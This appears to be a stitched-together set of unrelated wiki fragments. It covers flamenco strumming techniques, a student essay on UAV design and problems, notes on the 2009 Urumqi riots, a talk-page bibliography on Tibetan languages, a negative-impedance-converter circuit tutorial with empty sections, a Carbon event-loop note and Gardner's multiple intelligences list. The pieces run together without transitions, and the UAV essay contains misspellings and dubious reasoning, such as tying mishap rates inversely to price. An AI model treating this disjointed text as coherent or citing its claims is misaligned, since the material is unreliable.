* Golpe - the Spanish word for &quot;tap&quot;. This technique involves &quot;tapping&quot; the body of the guitar to produce a percussive sound. The third finger of the right-hand strikes the table of the guitar with the nail and flesh. Flamenco guitars have a &quot;golpeador&quot; (plastic cover) which protects the wood of the guitar during the use of this technique

* Rasgueo - this is the most common strumming technique for flamenco. The right-hand is formed into a closed fist with the thumb resting against the guitar or low E string for support, and each finger is flicked out one at a time (4-stroke rasgueo) to sound the strings with the nails. A common variation is to use the technique with only the index finger. The index finger is also used for the up-stroke which only strikes the treble strings after the completion of the 4-stroke rasgueo.

An overview of the considerations that must be taken into account during the design of an unmanned aerial vehicle (UAV), identifying the current uses of the vehicles, along with their problems and limitations and discussing the potential future applications of UAV technology.
1) INTRODUCTION
An unmanned ariel vehicle (UAV) is a vehicle that can be used for various air navigational purposes. A UAV can be self piloted or controlled externally through a remote control and also carries payload equipments such as cameras, sensors and communication equipments (Aftergood 2008). It goes to places which would be considered dangerous for human beings to go. For example in the Middle East presently, US military forces use spy UAV’s to monitor the ongoing act of terrorism (Marks 2009). This essay will argue how UAVs have failed in the world presently and the ways the application of the technology behind UAVs can be helpful to mankind in the future. The outline of this essay will be as follows: Firstly, the overview of the considerations that a UAV designer must consider when designing a UAV.Secondly, the present use of the vehicle in the world today will be mentioned. After that, the problems and limitations will also be mentioned and finally, the potential application of UAV technology will be discussed in details.
2) OVERVIEW OF CONSIDERATIONS WHEN DESIGNING A UAV
2.1) ACCESS TO AIR SPACE:-
Industries that design UAVs should have various considerations in mind when designing a UAV. Easy communication with other regular aircrafts should be a key factor in mind. This is a very important issue in the aviation in industry because UAVs are to have equal assess to airspace like any other civil aircraft (Marks 2006). In order to achieve this goal, a safe, standardized collision avoidance system needs to be developed by the UAV manufacturers (Ibid).
2.2) SUFFICIENT PAYLOAD:-
Moreover, the creation of a sufficient payload lifting capacity should be every UAV manufacturer goal in mind (Shim, Han, &amp; Yeo 2008). Every UAV requires a system for altitude control onboard, a crop dusting sequence and device fully automatic for agricultural purposes such as spraying of paddy rice fields (Ibid). Spraying of the field by the UAV helicopter can be very helpful in the productivity of crop because it is much faster than when it is done manually and reduces crop pests. Systems for emergency landing should also be taken into consideration because there can be a sudden loss of communication between the UAV and the ground controller (Ibid).
2.3) SIMPLIFIED:-
In addition, the design and entire structure of a UAV should be made in an easy way as possible to understand (Ibid) i.e. it shouldn’t be complicated with a lot of buttons, so that an average man can be able to understand and operate it without the help of any highly skilled person or any book manual. This is a very important key factor in the UAV market because customers tend to purchase UAVs that are easier to control, more reliable and perform methods that are superior to other kinds of UAVs so that the extra cost that they spend will be fully justified (Shim et al 2008). An example of a helicopter that is made easy to control is the draganflyer X6 UAV helicopter. This helicopter UAV operates on 11 sensors and lines of codes that help stabilizes it during a flight. It is the known best UAV helicopter of its class because of its design, style and easy operation (Draganflyer innovations Inc. 2009).
3) USES
3.1) MILITARY SECTOR:- 
In the military sector, rapid deployed UAVs (RDUAV) and air launched rapid deployment UAVs (AL-RDUAV) are used for combat purposes (Chen 2008). These UAVs are more reliable than other types of UAVs in the military aspect (Ibid). They have a wide operation range of speed for various kinds of military missions such as; endurance run for a small speed, high subsonic speed for high-speed air target acquisition, high subsonic speed for large observation area, high subsonic speed for high-risk area and high survival rate, and a high subsonic speed against adverse weather (Ibid). The U.S military uses this kind of UAV for anti-terror mission and serious emergency call in the Middle East because of the high efficiency of the UAV (Marks 2009).
3.2) CIVILIAN SECTOR:-
According to (Shim et al 2008), civilian UAVs are mainly used for reporting the situation of traffic, monitoring of disaster, and ariel photography. The civilian Yamaha RMAX has already been successful in some parts of Asia that mainly grow rice (Shim et al 2008) &amp; (Marks 2006). A spraying device is fixed under the fuselage of the UAV for spraying crops (Shim et al 2008). The Yamaha RMAX is also used to monitor the active volcanoes and vents in Japan (Marks 2006), making volcanic monitoring much easier and safer, because monitoring volcanic activities by crews on board the flight can be dangerous (Geophysical research abstracts 2006).
4) PROBLEMS
4.1) EXPLOSIVE TAKE- OFF:-
Fixed wing UAVs use conventional take off methods such as; rolling takeoff, RATO (rocket assisted take off), hydraulic and pneumatic takeoff methods (Cheng 2008). In the case of the rocket assisted takeoff, a rocket is being fired upwards to give the fixed wing UAV an upward thrust (Ibid). The rocket contains explosives substances that can be very harmful to the crews that are in operation, causing injuries to the crew and damages to the equipment in use or surrounding equipments (Ibid). This kind of problem rarely happens in a manned aircraft because the distance between the aircraft that is about to take off is a bit far from the ground crews.
4.2) SIZE AND LIMITED SPACE:-
 In a UAV, the rolling takeoff method is limited to the kind of area where the UAV is taking off from. This can be a problem in a case of emergency where an immediate takeoff is required, and there is little or no amount of space for the rolling of the UAV (Ibid). Launching a fixed winged UAV through a hydraulic and pneumatic takeoff method depends on the size and weight of the UAV (Ibid). If the weight of the UAV  that is about to be deployed is far more heavy than the required weight, a delay in deployment will occur because the force that the massive UAV exerts on the hydraulic launcher is greater that the upward thrust the hydraulic launcher exerts on the UAV (Ibid). However in a manned aircraft, take-off space is not a barrier because there is unlimited substantial amount of for the craft to take off.
4.3) MISHAP RATE:- 
In a manned aircraft, when there is an emergency problem in the aircraft, the pilot flying the plane notices the problem through the cockpit indicators and can be able to rectify the problem (Tyabji 2007). But in an unmanned aircraft, if a problem that needs an emergency solution 

occurs, there is no person onboard the flight that will try to solve the problem (Ibid). The average mishap rate of UAVs over the past seven years has been 4.28% (Ibid) because of being crewless. Another problem facing UAV pilots is that the menu buttons for navigating the craft are too complicated (Ibid). It takes quite a long time for the pilot to find the obvious button to trigger causing time to be wasted (Ibid). According to (Cheng 2008) helicopter style UAV wastes too much fuel and time to reach a troubled spot. The time wasted can lead to a loss in national profit (Ibid). According to (Marks 2006) Some UAVs can also be a risk to national profit because they fly around without any air traffic regulation. A police surveillance UAV was forbidden in Los Angeles sheriff’s department from flying because of causing risk to other air traffic and loss in national profit (Ibid). This high mishap rate in UAV is greater than that of a manned aircraft, because in manned aircraft crews on board the flight might be able to avoid a foreseen accident (Tyabji 2007).















 
FIGURE 1: RQ-1A PREDATOR MISHAP RATE

Figure 1 above shows the average mishap rate of the RQ-1A PREDATOR UAV. Mishap is the number of accidents occurring per 100,000 hours of fleet time of UAVs. This data was obtained in the year 2005.




From figure 1 above it is shown that UAVs have not succeeded in being reliable because a possible accident can occur through any of the means stated above such as; human/ground problems, flight control problems, common problems, miscellaneous problems. These mishap rate trends are lesser in manned aircraft because it is easy for the pilot flying the airplane to detect the any problem that occurs in the air craft suddenly. These mishap problems are likely to decrease in the future. However, the rate of mishap rate is inversely proportional to the price of the UAVs i.e. as the problem lessens the price of obtaining a UAV increases. So in the future, there is a possibility that the price of obtaining a UAV will be expensive.  
5) LIMITATIONS
5.1) EXPENSIVE:-
The price of obtaining a UAV is too expensive (Shim et al 2008). This price barrier limits the amount of people that purchase UAV. Average people such as Farmers that need a UAV for their crop production can’t be able to afford it (Ibid). Price decrease of UAVs in the future could help the productivity of crops on a larger scale.
5.2) EDUCATED:-
Moreover, before gaining assesses to operate a UAV you must have achieved some educational qualifications in a higher institution relating to piloting (Shim et al 2008). Obtaining this qualification might take a long time because you have to have some knowledge in systems like general principle of flight dynamics, electronics, communication, navigational systems and many more (Ibid). Aviation industries should make flying a UAV not complicated in the future in order to enable ordinary people gain assess to flying a UAV.
5.3) FAILURE OF AVIATION INDUSTRY:-
According to (Marks 2006) the failure of the aviation industry to obtain the necessary radio frequencies needed for operating the UAV has become a limitation in areas which the UAV can go, because it can interrupt other devices that use radio frequencies to operate. So UAVs have to operate on their own range of frequency that does not interrupt with wireless networks (Ibid).
6) FUTURE APPLICATIONS OF UAV TECHNOLOGY

6.1) CIVILIAN APPLICATION:-
In the future, all the problems and limitations of UAV can be less if they are all tackled, making the application of UAV technology used in some various functions such as; criminal surveillance purposes and fire services search and rescue missions on the coast guard, inspection of power and power pipeline (Mark 2006).UAV technology can also be used to provide wireless coverage to broadband and cellphone providers (Ibid).Moreover, aerospace companies plan to create civilian pilotless planes because of the success of the military UAV (Marks 2006).
6.2) MILITARY APPLICATION:-
 The success of military UAV has been obvious in most parts of the world including the Asia-pacific region. The quick victory the U.S gained over Iraq was mainly due to the high-tech intelligence assisted by Global Hawk (Newcome 2004) which in turn helped the U.S forces to attack and destroy control and command over Iraqi leadership (Rooney 2003). Therefore, in the future coming, UAV will be widely used in gathering intelligence in the world which is notable in China, India and Australia who are already investing in it (Newcome 2004). According to (Heath 2003) with the rapid improvement of the technology, human beings will be likely to survive the future in battle fields. Therefore manned fighters and bombers, even though will not be completely replaced, will still be used in lesser circumstances, resulting on more reliance on UAVs in military combat.
6.3) MORE PREFERED:-
 Moreover, as UAV create the commander a greater degree of awareness, they will be preferred over current methods, for example the use of land rovers and light helicopters in the Australian army in warfare to fly over the territory of the enemy monitoring continuously (Mac Carry 1999).In addition, there is possibility that UAVs can replace manned aircrafts in the future (Casner 2001). However from the technological and commercial point of view this issue is not totally clear. No passenger would want to board an aircraft that has no pilot flying it because the technological factors are made unaware in the sight of the public (Ibid). 
7) CONCLUSION
UAV will be significant in the future to come if the problems and limitations of UAVs are solved. The problems can be solved by the improvement of the failures UAV suffers presently. If the problems and limitations of UAVs are solved rapidly there will be a possibility of UAV surpassing manned aircraft in the future to come. However, the surpassing of manned aircrafts over UAVs can be limited. It can be limited in the sense that no one would like to board an unmanned aircraft because, if the craft experiences a problem high above in the sky, no one on board will be able solve the problem since everyone on board is a passenger but UAVs can surpass manned aircraft in the military sector. In conclusion this essay has shown how UAVs have failed compared to manned aircraft, and how UAVs can be useful in the future to come if all the problems and limitations are tackled.

Following reports of ill-treatment of a Uighur migrant worker in Guangdong province, Uighurs in Xinjiang started a riot in the provincial capital, Urumqi. Before police managed to quell the ethnic inspired unrest, nearly 200 people had been killed&lt;ref&gt;[http://news.bbc.co.uk/2/hi/asia-pacific/8308169.stm Death sentences for Xinjiang riot]&lt;/ref&gt; &amp;mdash; mostly Han Chinese&lt;ref&gt;[http://news.bbc.co.uk/2/hi/8146069.stm Most Xinjiang dead Han Chinese]&lt;/ref&gt;

The Chinese government came down hard against the Muslim Uighurs in the name of anti-separatism and counter-terrorism&lt;ref&gt;[http://www.hrw.org/en/news/2005/04/10/china-religious-repression-uighur-muslims China: Religious Repression of Uighur Muslims] April 2005 ''Human Rights Watch''&lt;/ref&gt;

==Citation style==

I am trying to use citation templates to make this page more robust and consistent, but am having trouble with certain data not displaying despite being in the citation template. [[User:Tibetologist|Tibetologist]] ([[User talk:Tibetologist|talk]]) 12:09, 23 July 2009 (UTC)

==Additions to bibliography unwelcome?==

Dear Tibetologist, it is somewhat difficult to understand why you delete serious additions to your bibliography; or do you want to keep it selective rather than trying to make it more comprehensive??? Co-operation to your very useful &quot;book&quot; seems to be unwelcome which is somewhat surprising. --[[User:Clemensmarabu|Clemensmarabu]] ([[User talk:Clemensmarabu|talk]]) 18:38, 31 October 2009 (UTC)

This I have done once. On about four occasions I have not. What is the difference? The one I deleted was a bibliography of himalayan studies (i.e. not specifically about Tibetan languages). Also, although it was added to the bibliography it was not added to the discussion at the top. I would be happy to have the item if it discussion of it is added in the relevant section. [[User:Tibetologist|Tibetologist]] ([[User talk:Tibetologist|talk]]) 09:47, 2 November 2009 (UTC)

Sorry, I just went in and added the Tibetan Dialects Project at Berne because it will be really important if it ever gets published. It's already important for lucky people who have the &quot;preprints.&quot; And you (or some editor of this page) already praised my not-yet-published work so I thought I could praise someone else's.

Roerich didn’t do anything about Old or Classical Tibetan
One should mention instead:

what about the study by Zeisler 2004?

Spoken Tibetan Languages
Western Dialects
Balti
Balti Grammars

add
Read, A.F.C. 1934. Balti grammar. (James G. Forlong Fund, 15.) London: The Royal Asiatic Society.

for Syntax one could add Zeisler 2004

Ladakhi
Texts
&quot;A Tibetan script Ladakhi text is Francke (DATE 2000).&quot;
there are more than one! perhaps check the Francke bibliographies; the most important one, however is
Francke, August Herrmann. 1905–41. Gšamyulna bšadpaḥi Kesargyi sgruṅs bžugs. A Lower Ladakhi version of the Kesar saga. (Bibliotheca Indica, work, 168.), Calcutta 1905–1909 (Fasc. 1–4), 1941 (Fasc. 5): Royal Asiatic Society of Bengal. [Reprint 1981: The Epic of Gesar. Kunzang Tobgyel and Mani Dorje, Vol. 29. Thimphu, Bhutan: Druk Sherig Press].

If the diacritics don't show up: Gshamyulna bshadpa'i Kesargyi sgrungs bzhugs

Phonology
you could add Zeisler 2009 on the retention of prefixes in compounds

Grammars
&quot;Grammars of Ladakhi include Francke ([1901] 1979), Koshal (1979, 1982), Norman (2001). Tournadre (1996) and Zeisler (2004) treat specific topics in Ladakhi grammar.&quot; More grammatical topics on Ladakhi are covered by Zeisler 2007 (case marking patterns) and 2011 (optional ergative marking) 

Purik
add
Rangan, K. 1975. Balti [Purki] phonetic reader. (Central Institute of Indian Lan-guages phonetic reader series, 17.) Mysore: Central Institute of Indian Languages. 
––––. 1979. Purki Grammar. (Central Institute of Indian Languages grammar series, 5.) Mysore: Central Institute of Indian Languages.

Lhasa
Verbal System
one could again mention Zeisler 2004

Amdo Tibetan (North East Group)

== Introduction ==

=== What a VNIC operating in linear mode is ===

Negative impedance (resistance) converter with voltage inversion (VNIC) is a true negative resistor having an [[Circuit Idea/Revealing the Mystery of Negative Impedance#Current-driven_negative_impedance_elements_2|S-shaped]] IV curve (Fig. 1a). This composed circuit consists of two components (Fig. 1b): a &quot;positive&quot; resistor R and an amplifier with gain of 2 that amplifies the voltage drop across the resistor. The positive resistor and the amplifier's output are connected in series. The amplifier is implemented by the op-amp OA and the two equal resistors R1 and R2 constituting a voltage divider with ratio 0.5. In this way, the resistor R converts the flowing current into a voltage drop; then, the op-amp amplifies it two times and adds its output voltage in series to the voltage drop. Half the voltage compensates the voltage drop across the resistor R and the rest half remains. Thus the op-amp circuit behaves as a voltage source producing a voltage V&lt;sub&gt;OA&lt;/sub&gt; that is equivalent to the voltage drop across the resistor R (V&lt;sub&gt;OA&lt;/sub&gt; = V&lt;sub&gt;R&lt;/sub&gt; = R.I). The op-amp as though converts the &quot;positive&quot; resistance R into a negative one; that is why, this circuit is named ''negative impedance converter''. As the voltage across the circuit has an opposite polarity to the voltage drop across the initial &quot;positive&quot; resistor R, it is named ''negative impedance converter with voltage inversion''.

=== How to investigate the linear mode of VNIC ===

VNIC is a two-terminal circuit; so, to give an idea of how it operates, we have to measure its IV curve. For this purpose, we have to pass a varying input current through the circuit and to measure the output voltage between its terminals. There are seven typical for the circuit operation points over the IV curve representing the corresponding six circuit states. For each of them, we may draw the corresponding picture of partial IV curve (from beginning to the current point) and the corresponding circuit diagram representing the current state. Let's label the first sequence of pictures with extension &quot;a&quot; and place them on the left; accordingly, to label the second sequence of pictures with extension &quot;b&quot; and place them on the right.

[[Image:Linear_vnic_1a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 1a: An S-shaped curve of voltage inversion NIC.&lt;/center&gt;]]

[[Image:Linear_vnic_1b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 1b: Enriching the classic circuit diagram of voltage inversion NIC by superimposed voltage bars and current loops.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

== Investigating the circuit at ideal driving conditions ==

The ideal input source for a VNIC acting in linear mode is the constant current source (CCS). If we begin sinking a current from VNIC (Fig. 2b), it creates a voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R and the voltage of the inverting input decreases (figuratively speaking, the input current source &quot;pulls down&quot; the bottom end of the resistor R toward the ground). The op-amp increases its output voltage trying to restore the equilibrium (it &quot;pulls up&quot; the top end of the resistor R toward the positive supply rail). 

=== Bottom positive resistance region ===

==== Negative input current, negative output voltage ====

From the initial point 0 to point 1 (Fig. 2a) we sink a big enough current |I&lt;sub&gt;IN&lt;/sub&gt;| &gt; V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; (Fig. 2b) is bigger than the positive voltage supply. As a result, the op-amp is in positive saturation but the voltage of the inverting input and the VNIC input voltage (across its two terminals) is negative. The circuit has positive resistance; it behaves as a real voltage source with a constant voltage V&lt;sub&gt;SAT+&lt;/sub&gt; and an internal resistance R (see the equivalent circuit on the left side of Fig. 2b). It is represented by a linear IV curve on Fig. 2a (the part from point 0 to point 1).

[[Image:Linear_vnic_2a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 2a: Scanning the left bottom part (0 - 1) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_2b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 2b: Sinking a big current &lt;nowiki&gt;|&lt;/nowiki&gt;I&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &gt; V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Negative input current, zero output voltage ====

At point 1 (Fig. 3a), we sink a relatively moderate current |I&lt;sub&gt;IN&lt;/sub&gt;| = V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is equal to the positive saturation voltage. The op-amp continues staying in positive saturation (Fig. 3b) but the voltage of the inverting input and the VNIC input voltage is zero. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_vnic_3a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 3a: Investigating the point 1 of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_3b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 3b: Sinking a relatively moderate current &lt;nowiki&gt;|&lt;/nowiki&gt;I&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; = V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Negative input current, positive output voltage ====

From point 1 to point 2 (Fig. 4a), we sink a moderate current V&lt;sub&gt;SAT+&lt;/sub&gt;/2R &lt; |I&lt;sub&gt;IN&lt;/sub&gt;| &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is less than the positive saturation voltage (Fig. 4b). But as the voltage of the inverting input is less than the voltage of the non-inverting input, the op-amp continues staying in positive saturation and the voltage of the inverting input (the VNIC input voltage) is positive. The circuit possesses a positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_vnic_4a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 4a: Scanning the right bottom part (1 - 2) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_4b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 4b: Sinking a moderate current V&lt;sub&gt;SAT+&lt;/sub&gt;/2R &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;I&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/R from VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Middle negative resistance region ===

==== Negative input current, positive output voltage ====

The “magic” of negative resistance begins at point 2. From point 2 to point 3 (Fig. 5a), we sink a low current |I&lt;sub&gt;IN&lt;/sub&gt;| &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/2R from VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is less than the half positive saturation voltage (Fig. 5b). The op-amp goes out of saturation and begins operating in active region. The voltage of the inverting input is almost equal to the voltage of the non-inverting input. The input current decreases continuously and the output voltage decreases as well. As a result, the op-amp IV curve moves up and the crossing operating point slides over a new dynamic IV curve representing the negative resistance. Note it is not a real IV curve; it is an artificial, imaginary IV curve having a negative slope and passing through the origin of the coordinate system. The whole circuit behaves as a &quot;helping&quot; dynamic voltage source that is connected in series and in the same direction with the input current source.

[[Image:Linear_vnic_5a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 5a: Scanning the right middle part (2 - 3) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_5b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 5b: Sinking a low current &lt;nowiki&gt;|&lt;/nowiki&gt;I&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/2R from VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Zero input current, zero output voltage ====

At point 3 (Fig. 6a) there is no input current. There is no voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R (Fig. 6b) and the op-amp produces zero output voltage. A virtual ground appears at the inverting input and the whole circuit behaves as just a resistor R. On the graphical presentation, the op-amp IV curve crosses the origin.

[[Image:Linear_vnic_6a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 6a: Investigating the point 3 of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_6b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 6b: Sinking/injecting no current I&lt;sub&gt;IN&lt;/sub&gt; = 0 from/to VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input current, negative output voltage ====
 
From point 3 to point 4 (Fig. 7a), we begin injecting a low current I&lt;sub&gt;IN&lt;/sub&gt; &lt; |V&lt;sub&gt;SAT-|&lt;/sub&gt;/2R to VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is less than the half negative saturation voltage (Fig. 7b). The op-amp continues operating in active region and the voltage of the inverting input is almost equal to the voltage of the non-inverting input. The input current increases continuously and the output voltage increases as well. The op-amp IV curve continues moving up and the crossing operating point continues sliding over the negative resistance IV curve. The whole circuit continues behaving as a &quot;helping&quot; dynamic voltage source connected in series and in the same direction with the input current source.

[[Image:Linear_vnic_7a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 7a: Scanning the left middle part (3 - 4) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_7b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 7b: Injecting a low current I&lt;sub&gt;IN&lt;/sub&gt; &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/2R into VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Top positive resistance region ===

==== Positive input current, negative output voltage ====

From point 4 to point 5 (Fig. 8a), we inject a moderate current |V&lt;sub&gt;SAT-&lt;/sub&gt;|/2R &lt; I&lt;sub&gt;IN&lt;/sub&gt; &lt; |V&lt;sub&gt;SAT-&lt;/sub&gt;|/R into VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is less than the negative saturation voltage (Fig. 8b). But as the voltage of the non-inverting input is more negative than the voltage of the inverting input, the op-amp continues staying in negative saturation and the voltage of the inverting input (the VNIC input voltage) is negative. The circuit possesses a positive resistance; it behaves again as a real voltage source with a constant voltage V and an internal resistance R.

[[Image:Linear_vnic_8a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 8a: Scanning the left top part (4 - 5) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_8b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 8b: Injecting a moderate current &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/2R &lt; I&lt;sub&gt;IN&lt;/sub&gt; &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/R into VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input current, zero output voltage ====

At point 5 (Fig. 9a), we inject a relatively moderate current I&lt;sub&gt;IN&lt;/sub&gt; = |V&lt;sub&gt;SAT-&lt;/sub&gt;|/R into VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is equal to the negative saturation voltage. The op-amp continues staying in negative saturation (Fig. 9b) but the voltage of the inverting input and the VNIC input voltage is zero. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_vnic_9a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 9a: Investigating the point 5 of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_9b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 9b: Injecting a relatively moderate current I&lt;sub&gt;IN&lt;/sub&gt; = &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/R into VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input current, positive output voltage ====

From point 5 to the final point 6 (Fig. 10a) we inject a big current I&lt;sub&gt;IN&lt;/sub&gt; &gt; |V&lt;sub&gt;SAT-&lt;/sub&gt;|/R into VNIC so that the voltage drop V&lt;sub&gt;R&lt;/sub&gt; is bigger than the negative voltage supply (Fig. 10b). As a result, the op-amp continues staying in negative saturation but the voltage of the inverting input and the VNIC input voltage (across its two terminals) is positive. The circuit has positive resistance again; it behaves as a real voltage source (see the equivalent circuit on the left side of Fig. 10b). It is represented by a linear IV curve on Fig. 10a (the part from point 5 to point 6).

[[Image:Linear_vnic_10a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 10a: Scanning the right top part (5 - 6) of the curve.&lt;/center&gt;]]

[[Image:Linear_vnic_10b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 10b: Injecting a big current I&lt;sub&gt;IN&lt;/sub&gt; &gt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/R into VNIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

== Investigating the circuit at real driving conditions ==

In this case, we drive the VNIC by a real voltage source with voltage V and internal resistance Ri.

=== How to make VNIC operate in linear mode ===

== What is the relation between VNIC and inverting amplifier? ==

== Conclusions ==

VNIC, like every electronic device, has a finite input range that is limited by the power supply. If the input current does not exceed the maximum magnitude - |I&lt;sub&gt;IN&lt;/sub&gt;| &lt; |V&lt;sub&gt;SAT&lt;/sub&gt;|/2R (from point 2 to point 4), the op-amp is in active region. The whole circuit behaves as a true negative resistor with resistance -R. When the input current exceeds the maximum magnitude - |I&lt;sub&gt;IN&lt;/sub&gt;| &gt; |V&lt;sub&gt;SAT-&lt;/sub&gt;|/2R (from point 0 to point 2) or |I&lt;sub&gt;IN&lt;/sub&gt;| &gt; V&lt;sub&gt;SAT+&lt;/sub&gt;/2R (from point 4 to point 6), the “magic” of negative resistance ceases and the op-amp saturates. In these regions, the whole circuit behaves as a real voltage source with a constant voltage V&lt;sub&gt;SAT-&lt;/sub&gt;/V&lt;sub&gt;SAT+&lt;/sub&gt; and an internal resistance R.

== Event loop ==

The event loop is started with one function call: 

* RunApplicationEventLoop();

The event loop will process events as long as the application is running.  To exit the event loop, call QuitApplicationEventLoop().


== Registering events ==

* InstallEventHandler () - Creates an event handler for the application.
* AddEventTypesToHandler() - Adds an event used by the handler.

      <text xml:space="preserve">I am considering ditching AServe.  I really used to like it; it is a good way to tack a web server onto an existing project.  Now I cannot even get it to build on the current SBCL (others have had problems too).  I think that if breakage shows up in the current release and persists for months it is a sign that the package shouldn't be in this showcase.[[User:Zvsmith|Zvsmith]] ([[User talk:Zvsmith|talk]]) 17:01, 23 July 2009 (UTC)</text>

In 1983, a Harvard professor of psychology and education, Howard Gardner, theorized and wrote about multiple intelligences (MI), in Frames of the Mind: The Theory of Multiple Intelligences.  In this book, he defined intelligence as ‘the ability to solve problems or to create products that are valued within one or more cultural settings’ (Gardner, 1983, as cited by Gardner, 1999, p. 33).  Gardner defined seven intelligences listed below, suggesting that the first two (linguistics and logical/math) were mostly valued in schools.  In his later book,  Intelligence Reframed: Multiple Intelligence for the 21st Century (1999), Gardner proposed three additional intelligences, totaling to the following ten various cognitive and personal intelligences listed below:

1)	“Linguistic intelligence – involves sensitivity to spoken and written language, the ability to learn languages, and the capacity to use language to accomplish certain goals.  Lawyers, speakers, writers, poets, are among the people with high linguistic intelligence.

2)	Logical-mathematical intelligence – involves the capacity to analyze problems logically, carry out mathematical operations, and investigate issues scientifically.  Mathematicians, logicians, and scientists exploit logical-mathematical intelligence.

3)	Musical intelligence – entails skills in the performance, composition, and appreciation of musical patterns.

4)	Bodily-kinesthetic intelligence – entails the potential using one’s whole body or parts of the body to solve problems or fashion products.   Dancers, actors, and athletes, … also important for craftpersons, surgeons, mechanics, and other technically oriented professionals.

5)	Spatial intelligence – features the potential to recognize and manipulate the patterns of wide space (... for instance, by navigators and pilots) as well as the patterns of more confined areas (…those of importance to sculptors, surgeons, chess players, graphic artists, or architects)

6)	Interpersonal intelligence – denotes a person’s capacity to understand the intentions, motivations, and desires of other people and, consequently, to work effectively with others.  Salespeople, teachers, clinicians, religious leaders, political leaders, and actors all need acute interpersonal intelligence.

7)	Intrapersonal intelligence – involves the capacity to understand oneself, to have an effective working model of oneself – including one’s own desires, fears, and capacities – and to use such information effectively in regulating one’s own life” (Gardner, 1999, p. 41-43).

8)	 “Naturalist intelligence – demonstrates expertise in the recognition and classification of the numerous species…of his or her environment…like a biologist…those with extensive knowledge of the living world” (ibid. p. 48).

9)	“Spiritual intelligence – desire to know about experiences and cosmic entities, … of or relating to supernatural world, … our relationship to the wider world and to beings, … like our gods or our God; spiritual as achievement of a state of being or having a spiritual effect on others” (ibid. p. 54-57).

